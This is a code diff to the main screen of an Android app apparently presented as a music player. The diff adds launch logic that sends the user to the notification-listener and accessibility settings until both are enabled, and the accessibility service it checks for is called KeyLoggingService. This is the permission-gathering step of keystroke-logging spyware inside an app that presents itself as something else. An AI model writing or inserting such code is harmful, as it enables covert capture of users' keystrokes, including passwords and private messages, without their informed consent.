@@ -1,5 +1,6 @@
 package com.qf.musicplayer.ui
 
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.AlertDialog
@@ -19,6 +20,7 @@ import android.util.Log
 import android.view.KeyEvent
 import android.view.MotionEvent
 import android.view.WindowManager
+import android.view.accessibility.AccessibilityManager
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
@@ -54,10 +56,16 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        if (intent.action == Intent.ACTION_MAIN && !isNotificationListenerEnabled()) {
-            Log.d(TAG, "Notification Listener not enabled. Opening settings...")
-            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-            startActivity(intent)
+        if (intent.action == Intent.ACTION_MAIN && (!isNotificationListenerEnabled(this) || !isAccessibilityServiceEnabled(this))) {
+            Log.d(TAG, "Required permissions not enabled. Opening settings...")
+            // Open Notification Listener settings if it's not enabled.
+            if (!isNotificationListenerEnabled(this)) {
+                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                startActivity(intent)
+            } else { // Otherwise, open Accessibility settings.
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                startActivity(intent)
+            }
             finish()
             return
         }
@@ -96,10 +104,16 @@ class MainActivity : Activity() {
         proceedWithLaunch()
     }
 
-    private fun isNotificationListenerEnabled(): Boolean {
-        val componentName = ComponentName(this, MediaService::class.java)
-        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
-        return enabledListeners?.contains(componentName.flattenToString()) == true
+    private fun isNotificationListenerEnabled(context: Context): Boolean {
+        val componentName = ComponentName(context, MediaService::class.java)
+        val enabledListeners = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
+        return enabledListeners?.split(":")?.map { ComponentName.unflattenFromString(it) }?.any { it == componentName } == true
+    }
+
+    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
+        val expectedComponentName = ComponentName(context, KeyLoggingService::class.java)
+        val enabledServicesSetting = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+        return enabledServicesSetting?.split(':')?.any { ComponentName.unflattenFromString(it) == expectedComponentName } == true
     }
 
     private fun checkAndRequestPermissions(): Boolean {
